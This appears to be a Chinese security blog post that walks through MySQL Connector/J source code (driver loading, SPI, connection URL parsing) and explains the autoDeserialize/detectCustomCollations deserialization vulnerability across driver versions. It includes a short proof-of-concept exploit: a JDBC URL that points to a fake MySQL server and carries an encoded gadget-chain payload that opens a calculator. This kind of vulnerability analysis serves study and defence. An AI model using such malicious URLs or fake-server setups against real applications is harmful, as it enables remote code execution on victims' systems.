<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Statement</span> <span class="variable">statement</span> <span class="operator">=</span> connection.createStatement();</span><br><span class="line"></span><br><span class="line">statement.execute(<span class="string">&quot;select * from user&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">ResultSet</span> <span class="variable">set</span> <span class="operator">=</span> statement.getResultSet();</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (set.next()) &#123;</span><br><span class="line"></span><br><span class="line">System.out.println(set.getString(<span class="number">1</span>));</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">statement.close();</span><br><span class="line"></span><br><span class="line">connection.close();</span><br></pre></td></tr></table></figure>

<p>1 表⽰插叙的列索引，索引从 1 开始，也可以换成列名</p>
<p>这⾥通过DriverManager.getConnection⽅法连接数据库，返回的是com.mysql.cj.jdbc.ConnectionImpl对象</p>
<p>还提⽰我们说com.mysql.jdbc.Driver驱动过时，使⽤的新的驱动com.mysql.cj.jdbc.Driver</p>
<h2 id="SPI-机制"><a href="#SPI-机制" class="headerlink" title="SPI 机制"></a><strong>SPI</strong> 机制</h2><p>Service Provider Interface，是JDK内置的⼀种服务提供发现机制，可以⽤来启动框架扩展和替换组建。服务提供接⼝，不同⼚商可以针对同⼀个接⼝做出不同的实现。</p>
<p>当服务提供者提供了⼀种接⼝的实现之后，需要在classpath下的 META-INF&#x2F;services&#x2F; ⽬录下创建⼀个以服务接⼝命名的⽂件，⽂件内容就是这个接⼝的具体实现类。</p>
<p>当程序需要这个服务时，就可以通过查找这个jar包的 META-INF&#x2F;services&#x2F; 中的配置⽂件，配置⽂件中有接⼝的具体实现类名，可以根据这个类名进行加载实例化。</p>
<p>在connect的jar包中可以看到</p>
<h2 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h2><p>环境：mysql-connector-java-8.0.12</p>
<h3 id="加载驱动"><a href="#加载驱动" class="headerlink" title="加载驱动"></a>加载驱动</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Class.forName(CLASS_NAME);</span><br><span class="line">或者是</span><br><span class="line">DriverManager.registerDriver(<span class="keyword">new</span> <span class="title class_">Driver</span>());</span><br></pre></td></tr></table></figure>

<p>当使⽤Class.forName获取类的Class对象时，会触发这个类的静态代码块，跟进这个驱动类</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> &#123;</span><br><span class="line">    System.err.println(<span class="string">&quot;Loading class `com.mysql.jdbc.Driver&#x27;. This is deprecated. The new driver class is `com.mysql.cj.jdbc.Driver&#x27;. The driver is automatically registered via the SPI and manual loading of the driver class is generally unnecessary.&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>就是我们看⻅的驱动类过时信息</p>
<p>还能看⻅这个类还继承了com.mysql.cj.jdbc.Driver类，也就是新的驱动类，⽗类的静态代码块先被执⾏</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        DriverManager.registerDriver(<span class="keyword">new</span> <span class="title class_">Driver</span>());</span><br><span class="line">    &#125; <span class="keyword">catch</span> (SQLException var1) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(<span class="string">&quot;Can&#x27;t register driver!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>通过DriverManager.registerDriver⽅法来注册驱动，要注册的驱动即是com.mysql.cj.jdbc.Driver对象</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title function_">registerDriver</span><span class="params">(java.sql.Driver driver,</span></span><br><span class="line"><span class="params">        DriverAction da)</span></span><br><span class="line">    <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Register the driver if it has not already been added to our list */</span></span><br><span class="line">    <span class="keyword">if</span>(driver != <span class="literal">null</span>) &#123;</span><br><span class="line">        registeredDrivers.addIfAbsent(<span class="keyword">new</span> <span class="title class_">DriverInfo</span>(driver, da));</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// This is for compatibility with the original DriverManager</span></span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">NullPointerException</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    println(<span class="string">&quot;registerDriver: &quot;</span> + driver);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>⽅法中实例化了⼀个DriverInfo对象⽤来存放驱动类信息。</p>
<p>registeredDrivers是DriverManager对象的⼀个变量，通过addIfAbsent⽅法，将DriverInfo对象信息存放进registeredDrivers变量中</p>
<h3 id="获取连接"><a href="#获取连接" class="headerlink" title="获取连接"></a>获取连接</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Connection</span> <span class="variable">connection</span> <span class="operator">=</span> DriverManager.getConnection(URL, USERNAME, PASSWORD);</span><br></pre></td></tr></table></figure>

<p>跟进getConnection⽅法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Connection <span class="title function_">getConnection</span><span class="params">(String url,</span></span><br><span class="line"><span class="params">    String user, String password)</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line">    java.util.<span class="type">Properties</span> <span class="variable">info</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">java</span>.util.Properties();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (user != <span class="literal">null</span>) &#123;</span><br><span class="line">        info.put(<span class="string">&quot;user&quot;</span>, user);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (password != <span class="literal">null</span>) &#123;</span><br><span class="line">        info.put(<span class="string">&quot;password&quot;</span>, password);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> (getConnection(url, info, Reflection.getCallerClass()));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>其中Reflection.getCallerClass⽅法是⽤于获取调⽤者的类，即在运⾏时确定正在调⽤该⽅法的类的名称，返回⼀个Class对象</p>
<p>跟进getConnection的重载⽅法</p>
<p>关键部分来啦</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span>(DriverInfo aDriver : registeredDrivers) &#123;</span><br><span class="line">    <span class="comment">// If the caller does not have permission to load the driver then</span></span><br><span class="line">    <span class="comment">// skip it.</span></span><br><span class="line">    <span class="keyword">if</span>(isDriverAllowed(aDriver.driver, callerCL)) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            println(<span class="string">&quot;    trying &quot;</span> + aDriver.driver.getClass().getName());</span><br><span class="line">            <span class="type">Connection</span> <span class="variable">con</span> <span class="operator">=</span> aDriver.driver.connect(url, info);</span><br><span class="line">            <span class="keyword">if</span> (con != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="comment">// Success!</span></span><br><span class="line">                println(<span class="string">&quot;getConnection returning &quot;</span> + aDriver.driver.getClass().getName());</span><br><span class="line">                <span class="keyword">return</span> (con);</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure>

<p>这⾥遍历registeredDrivers变量的值，⾥⾯存放着我们注册过的驱动，随即通过DriverInfo对象获取对应驱动然后就是通过获取的驱动，调⽤其connet⽅法进⾏连接</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Connection <span class="title function_">connect</span><span class="params">(String url, Properties info)</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (!ConnectionUrl.acceptsUrl(url)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="type">ConnectionUrl</span> <span class="variable">conStr</span> <span class="operator">=</span> ConnectionUrl.getConnectionUrlInstance(url, info);</span><br><span class="line">                <span class="keyword">switch</span> (conStr.getType()) &#123;</span><br><span class="line">                    <span class="keyword">case</span> SINGLE_CONNECTION:</span><br><span class="line">                        <span class="keyword">return</span> ConnectionImpl.getInstance(conStr.getMainHost());</span><br><span class="line">                    <span class="keyword">case</span> FAILOVER_CONNECTION:</span><br><span class="line">                    <span class="keyword">case</span> FAILOVER_DNS_SRV_CONNECTION:</span><br><span class="line">                        <span class="keyword">return</span> FailoverConnectionProxy.createProxyInstance(conStr);</span><br><span class="line">                    <span class="keyword">case</span> LOADBALANCE_CONNECTION:</span><br><span class="line">                    <span class="keyword">case</span> LOADBALANCE_DNS_SRV_CONNECTION:</span><br><span class="line">                        <span class="keyword">return</span> LoadBalancedConnectionProxy.createProxyInstance(conStr);</span><br><span class="line">                    <span class="keyword">case</span> REPLICATION_CONNECTION:</span><br><span class="line">                    <span class="keyword">case</span> REPLICATION_DNS_SRV_CONNECTION:</span><br><span class="line">                        <span class="keyword">return</span> ReplicationConnectionProxy.createProxyInstance(conStr);</span><br><span class="line">                    <span class="keyword">default</span>:</span><br><span class="line">                        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">                &#125;</span><br></pre></td></tr></table></figure>

<p>ConnectionUrl.acceptsUrl(url)⽅法判断url是否合法，主要判断是否存在协议</p>
<p>这⾥简要分析ConnectionUrl.getConnectionUrlInstance⽅法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    connectionUrl = (ConnectionUrl)connectionUrlCache.get(connStringCacheKey);</span><br><span class="line">    <span class="keyword">if</span> (connectionUrl == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="type">ConnectionUrlParser</span> <span class="variable">connStrParser</span> <span class="operator">=</span> ConnectionUrlParser.parseConnectionString(connString);</span><br><span class="line">        connectionUrl = ConnectionUrl.Type.getConnectionUrlInstance(connStrParser, info);</span><br><span class="line">        connectionUrlCache.put(connStringCacheKey, connectionUrl);</span><br></pre></td></tr></table></figure>

<p>跟进parseConnectionString跟进到最后</p>
<p>parseConnectionString⽅法⽤于解析传⼊的URL</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">parseConnectionString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">connString</span> <span class="operator">=</span> <span class="built_in">this</span>.baseConnectionString;</span><br><span class="line">....</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.scheme = decodeSkippingPlusSign(matcher.group(<span class="string">&quot;scheme&quot;</span>));</span><br><span class="line">            <span class="built_in">this</span>.authority = matcher.group(<span class="string">&quot;authority&quot;</span>);</span><br><span class="line">            <span class="built_in">this</span>.path = matcher.group(<span class="string">&quot;path&quot;</span>) == <span class="literal">null</span> ? <span class="literal">null</span> : decode(matcher.group(<span class="string">&quot;path&quot;</span>)).trim();</span><br><span class="line">            <span class="built_in">this</span>.query = matcher.group(<span class="string">&quot;query&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>传⼊的 jdbc:mysql:&#x2F;&#x2F;localhost:3306&#x2F;student ，解析结果为</p>
<p><img src="https://baicany.github.io/images/image-20231020220425785.png" alt="image-20231020220425785"></p>
<p>这⾥的path还会对解析到的部分进⾏⼀次urldecode</p>
<p>回到NonRegisteringDriver类，会调⽤到com.mysql.cj.jdbc.ConnectionImpl.getInstance⽅法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">switch</span> (conStr.getType()) &#123;</span><br><span class="line">    <span class="keyword">case</span> SINGLE_CONNECTION:</span><br><span class="line">        <span class="keyword">return</span> ConnectionImpl.getInstance(conStr.getMainHost());</span><br></pre></td></tr></table></figure>

<p>conStr.getMainHost⽅法会取到我们的URL信息 </p>
<p>getInstance⽅法返回⼀个新实例化的ConnectionImpl对象，其构造⽅法：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="built_in">this</span>.props = hostInfo.exposeAsProperties();</span><br><span class="line"><span class="built_in">this</span>.propertySet = <span class="keyword">new</span> <span class="title class_">JdbcPropertySetImpl</span>();</span><br><span class="line"><span class="built_in">this</span>.propertySet.initializeProperties(<span class="built_in">this</span>.props);</span><br></pre></td></tr></table></figure>

<p>exposeAsProperties⽅法则是将遍历hostinfo信息然后设置成键值对</p>
<p>然后实例化了⼀个JdbcPropertySetImpl对象，其⽗类构造⽅法也被调⽤</p>
<p>遍历PropertyDefinitions.<strong>PROPERTY_NAME_TO_PROPERTY_DEFINITION</strong>的值，依次存放进</p>
<p><strong>PROPERTY_NAME_TO_RUNTIME_PROPERTY</strong></p>
<p>这些值正是数据库所允许提供的扩展参数，也就是前⾯提到的query</p>
<h3 id="扩展参数带来的安全问题"><a href="#扩展参数带来的安全问题" class="headerlink" title="扩展参数带来的安全问题"></a>扩展参数带来的安全问题</h3><p>mysql JDBC 中包含⼀个危险的扩展参数： autoDeserialize。这个参数配置为true时，JDBC客户端将会⾃动反序列化服务端返回的BLOB类型字段</p>
<h2 id="detectCustomCollations链"><a href="#detectCustomCollations链" class="headerlink" title="detectCustomCollations链"></a>detectCustomCollations链</h2><p>环境：mysql-connector-java-5.1.28</p>
<p>环境：mysql-connector-java-5.1.28 为了复现漏洞，这⾥选了合适的版本，上⾯调试部分是我⾃⼰通过调试获取连接的过程发现URL还存在有扩展参数的过程。⼤体逻辑 差不多，⼀些细节存在差异所以导致漏洞</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    com.mysql.jdbc.<span class="type">Connection</span> <span class="variable">newConn</span> <span class="operator">=</span> ConnectionImpl.getInstance(<span class="built_in">this</span>.host(props), <span class="built_in">this</span>.port(props), props, <span class="built_in">this</span>.database(props), url);</span><br><span class="line">    <span class="keyword">return</span> newConn;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>同上⾯⾼版本⼀样，这⾥⼀样会实例化ConnetionImpl对象 最终会进⼊Util.handleNewInstance⽅法，这⾥会实例化JDBC4Connetion对象</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">JDBC4Connection</span><span class="params">(String hostToConnectTo, <span class="type">int</span> portToConnectTo, Properties info, String databaseToConnectTo, String url)</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line">    <span class="built_in">super</span>(hostToConnectTo, portToConnectTo, info, databaseToConnectTo, url);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>跟进⽗类构造⽅法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">ConnectionPropertiesImpl</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.allowLoadLocalInfile = <span class="keyword">new</span> <span class="title class_">BooleanConnectionProperty</span>(<span class="string">&quot;allowLoadLocalInfile&quot;</span>, <span class="literal">true</span>, Messages.getString(<span class="string">&quot;ConnectionProperties.loadDataLocal&quot;</span>), <span class="string">&quot;3.0.3&quot;</span>, SECURITY_CATEGORY, Integer.MAX_VALUE);</span><br><span class="line">    <span class="built_in">this</span>.allowMultiQueries = <span class="keyword">new</span> <span class="title class_">BooleanConnectionProperty</span>(<span class="string">&quot;allowMultiQueries&quot;</span>, <span class="literal">false</span>, Messages.getString(<span class="string">&quot;ConnectionProperties.allowMultiQueries&quot;</span>), <span class="string">&quot;3.1.1&quot;</span>, SECURITY_CATEGORY, <span class="number">1</span>);</span><br><span class="line">    <span class="built_in">this</span>.allowNanAndInf = <span class="keyword">new</span> <span class="title class_">BooleanConnectionProperty</span>(<span class="string">&quot;allowNanAndInf&quot;</span>, <span class="literal">false</span>, Messages.getString(<span class="string">&quot;ConnectionProperties.allowNANandINF&quot;</span>), <span class="string">&quot;3.1.5&quot;</span>, MISC_CATEGORY, Integer.MIN_VALUE);</span><br><span class="line">    <span class="built_in">this</span>.allowUrlInLocalInfile = <span class="keyword">new</span> <span class="title class_">BooleanConnectionProperty</span>(<span class="string">&quot;allowUrlInLocalInfile&quot;</span>, <span class="literal">false</span>, Messages.getString(<span class="string">&quot;ConnectionProperties.allowUrlInLoadLocal&quot;</span>), <span class="string">&quot;3.1.4&quot;</span>, SECURITY_CATEGORY, Integer.MAX_VALUE);</span><br><span class="line">    <span class="built_in">this</span>.alwaysSendSetIsolation = <span class="keyword">new</span> <span class="title class_">BooleanConnectionProperty</span>(<span class="string">&quot;alwaysSendSetIsolation&quot;</span>, <span class="literal">true</span>, Messages.getString(<span class="string">&quot;ConnectionProperties.alwaysSendSetIsolation&quot;</span>), <span class="string">&quot;3.1.7&quot;</span>, PERFORMANCE_CATEGORY, Integer.MAX_VALUE);</span><br><span class="line">    <span class="built_in">this</span>.autoClosePStmtStreams = <span class="keyword">new</span> <span class="title class_">BooleanConnectionProperty</span>(<span class="string">&quot;autoClosePStmtStreams&quot;</span>, <span class="literal">false</span>, Messages.getString(<span class="string">&quot;ConnectionProperties.autoClosePstmtStreams&quot;</span>), <span class="string">&quot;3.1.12&quot;</span>, MISC_CATEGORY, Integer.MIN_VALUE);</span><br><span class="line">    <span class="built_in">this</span>.allowMasterDownConnections = <span class="keyword">new</span> <span class="title class_">BooleanConnectionProperty</span>(<span class="string">&quot;allowMasterDownConnections&quot;</span>, <span class="literal">false</span>, Messages.getString(<span class="string">&quot;ConnectionProperties.allowMasterDownConnections&quot;</span>), <span class="string">&quot;5.1.27&quot;</span>, HA_CATEGORY, Integer.MAX_VALUE);</span><br><span class="line">    <span class="built_in">this</span>.autoDeserialize = <span class="keyword">new</span> <span class="title class_">BooleanConnectionProperty</span>(<span class="string">&quot;autoDeserialize&quot;</span>, <span class="literal">false</span>, Messages.getString(<span class="string">&quot;ConnectionProperties.autoDeserialize&quot;</span>), <span class="string">&quot;3.1.5&quot;</span>, MISC_CATEGORY, Integer.MIN_VALUE);</span><br><span class="line">    <span class="built_in">this</span>.autoGenerateTestcaseScript = <span class="keyword">new</span> <span class="title class_">BooleanConnectionProperty</span>(<span class="string">&quot;autoGenerateTestcaseScript&quot;</span>, <span class="literal">false</span>, Messages.getString(<span class="string">&quot;ConnectionProperties.autoGenerateTestcaseScript&quot;</span>), <span class="string">&quot;3.1.9&quot;</span>, DEBUGING_PROFILING_CATEGORY, Integer.MIN_VALUE);</span><br></pre></td></tr></table></figure>

<p>这⾥是扩展参数的初始化 ConnetionImpl对象构造⽅法在做完⼀些初始化后，会调⽤⼀些⽅法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.dbmd = <span class="built_in">this</span>.getMetaData(<span class="literal">false</span>, <span class="literal">false</span>);</span><br><span class="line">    <span class="built_in">this</span>.initializeSafeStatementInterceptors();</span><br><span class="line">    <span class="built_in">this</span>.createNewIO(<span class="literal">false</span>);</span><br><span class="line">    <span class="built_in">this</span>.unSafeStatementInterceptors();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>跟进到createNewIO⽅法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">createNewIO</span><span class="params">(<span class="type">boolean</span> isForReconnect)</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line">    <span class="keyword">synchronized</span>(<span class="built_in">this</span>.getConnectionMutex()) &#123;</span><br><span class="line">        <span class="type">Properties</span> <span class="variable">mergedProps</span> <span class="operator">=</span> <span class="built_in">this</span>.exposeAsProperties(<span class="built_in">this</span>.props);</span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">this</span>.getHighAvailability()) &#123;</span><br><span class="line">            <span class="built_in">this</span>.connectOneTryOnly(isForReconnect, mergedProps);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.connectWithRetries(isForReconnect, mergedProps);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这⾥会调⽤connectOneTryOnly⽅法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.coreConnect(mergedProps);</span><br><span class="line">    <span class="built_in">this</span>.connectionId = <span class="built_in">this</span>.io.getThreadId();</span><br><span class="line">    <span class="built_in">this</span>.isClosed = <span class="literal">false</span>;</span><br><span class="line">    <span class="type">boolean</span> <span class="variable">oldAutoCommit</span> <span class="operator">=</span> <span class="built_in">this</span>.getAutoCommit();</span><br><span class="line">    <span class="type">int</span> <span class="variable">oldIsolationLevel</span> <span class="operator">=</span> <span class="built_in">this</span>.isolationLevel;</span><br><span class="line">    <span class="type">boolean</span> <span class="variable">oldReadOnly</span> <span class="operator">=</span> <span class="built_in">this</span>.isReadOnly(<span class="literal">false</span>);</span><br><span class="line">    <span class="type">String</span> <span class="variable">oldCatalog</span> <span class="operator">=</span> <span class="built_in">this</span>.getCatalog();</span><br><span class="line">    <span class="built_in">this</span>.io.setStatementInterceptors(<span class="built_in">this</span>.statementInterceptors);</span><br><span class="line">    <span class="built_in">this</span>.initializePropsFromServer();</span><br></pre></td></tr></table></figure>

<p>coreConnect⽅法主要⽤于建⽴连接，完了以后会调⽤initializePropsFromServer⽅法，initializePropsFromServer⽅法内⼜会调⽤ buildCollationMapping⽅法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">        HashMap&lt;Integer, String&gt; javaCharset = <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">this</span>.versionMeetsMinimum(<span class="number">4</span>, <span class="number">1</span>, <span class="number">0</span>)) &#123;</span><br><span class="line">            javaCharset = <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">...</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">                        results = stmt.executeQuery(<span class="string">&quot;SHOW COLLATION&quot;</span>);</span><br><span class="line">                        <span class="keyword">if</span> (<span class="built_in">this</span>.versionMeetsMinimum(<span class="number">5</span>, <span class="number">0</span>, <span class="number">0</span>)) &#123;</span><br><span class="line">                            Util.resultSetToMap(sortedCollationMap, results, <span class="number">3</span>, <span class="number">2</span>);</span><br><span class="line">                        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                         </span><br></pre></td></tr></table></figure>

<p>stmt变量通过getMetadataSafeStatement⽅法获得当前环境的StatementImpl对象，然后通过executeQuery⽅法执⾏SQL语句 然后执⾏Util.resultSetToMap⽅法，versionMeetsMinimum⽅法是判断驱动程序版本的</p>
<figure class="highlight processing"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">resultSetToMap</span>(Map mappedValues, ResultSet rs, <span class="type">int</span> <span class="built_in">key</span>, <span class="type">int</span> value) <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line">    <span class="keyword">while</span>(rs.<span class="property">next</span>()) &#123;</span><br><span class="line">        mappedValues.<span class="property">put</span>(rs.<span class="property">getObject</span>(<span class="built_in">key</span>), rs.<span class="property">getObject</span>(value));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>会将SHOW COLLATION查询结果的第三列和第⼆列的值存放进mappedValues 还会调⽤ResultSetImpl对象的getObject⽅法，对应反序列化位置，需要字段类型为blob</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">case</span> -<span class="number">2</span>:</span><br><span class="line">    <span class="keyword">if</span> (field.getMysqlType() == <span class="number">255</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.getBytes(columnIndex);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (!field.isBinary() &amp;&amp; !field.isBlob()) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.getBytes(columnIndex);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="type">byte</span>[] data = <span class="built_in">this</span>.getBytes(columnIndex);</span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">this</span>.connection.getAutoDeserialize()) &#123;</span><br><span class="line">            <span class="keyword">return</span> data;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> data;</span><br><span class="line">            <span class="keyword">if</span> (data != <span class="literal">null</span> &amp;&amp; data.length &gt;= <span class="number">2</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (data[<span class="number">0</span>] != -<span class="number">84</span> || data[<span class="number">1</span>] != -<span class="number">19</span>) &#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="built_in">this</span>.getString(columnIndex);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="type">ByteArrayInputStream</span> <span class="variable">bytesIn</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(data);</span><br><span class="line">                    <span class="type">ObjectInputStream</span> <span class="variable">objIn</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(bytesIn);</span><br><span class="line">                    obj = objIn.readObject();</span><br><span class="line">                    objIn.close();</span><br><span class="line">                    bytesIn.close();</span><br><span class="line">                &#125;</span><br></pre></td></tr></table></figure>

<p>当攻击者能控制URL指向恶意mysql服务端时，控制扩展参数autoDeserialize为true，且SHOW COLLATION的返回结果需要有三个字 段，且需要字段2或3为BLOB装载我们的序列化数据，那么在返回数据时会触发反序列化造成攻击 那么怎么实现SHOW COLLATION这个SQL语句，能返回我们想要的数据呢？ 这⾥可以⽤cobar项⽬，它是分⽚数据库代理。也可以使⽤4ra1n师傅做的mysql-fake-server项⽬</p>
<p>设置好选项后，app会⽣成好poc，向这个poc发起数据库连接即可</p>
<p>exp</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> jdbc;</span><br><span class="line"><span class="keyword">import</span> java.sql.Connection;</span><br><span class="line"><span class="keyword">import</span> java.sql.DriverManager;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">jdbcConnect</span> &#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">	<span class="type">String</span> <span class="variable">CLASS_NAME</span> <span class="operator">=</span> <span class="string">&quot;com.mysql.jdbc.Driver&quot;</span>;</span><br><span class="line">	<span class="type">String</span> <span class="variable">URL</span> <span class="operator">=</span> <span class="string">&quot;jdbc:mysql://127.0.0.1:49240/test?autoDeserialize=true&amp;user=base64ZGVzZXJfQ0M0NF9vcGVuIC1hIENhbGN1bGF0b3I=&quot;</span>;</span><br><span class="line">	Class.forName(CLASS_NAME);</span><br><span class="line">	<span class="type">Connection</span> <span class="variable">connection</span> <span class="operator">=</span> DriverManager.getConnection(URL);</span><br><span class="line">	connection.close();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>**mysql-connector-java-5.1.29——5.1.40 **</p>
<p>环境：mysql-connector-java-5.1.29</p>
<p>简单看看改进的部分，位于com.mysql.jdbc.ConnectionImpl#buildCollationMapping⽅法</p>
<p>不仅需要驱动类版本⼤于4.1.0，还添加了新的要求</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="built_in">this</span>.versionMeetsMinimum(<span class="number">4</span>, <span class="number">1</span>, <span class="number">0</span>) &amp;&amp; <span class="built_in">this</span>.getDetectCustomCollations())</span><br></pre></td></tr></table></figure>

<p>getDetectCustomCollations⽅法返回扩展参数detectCustomCollations的值，若没设置，默认为false </p>
<p>只需要新添加扩展参数 detectCustomCollations&#x3D;true 即可，这样才有机会进⼊Util.resultSetToMap⽅法</p>
<p><strong>mysql-connector-java-5.1.41——5.1.48</strong></p>
<p> 环境：mysql-connector-java-5.1.41 </p>
<p>继续看看改进的部分，定位到 com.mysql.jdbc.ConnectionImpl#buildCollationMapping⽅法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (customCharset == <span class="literal">null</span> &amp;&amp; <span class="built_in">this</span>.getDetectCustomCollations() &amp;&amp; <span class="built_in">this</span>.versionMeetsMinimum(<span class="number">4</span>, <span class="number">1</span>, <span class="number">0</span>)) &#123;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>新加customCharset变量需要为null，默认为null，不管</p>
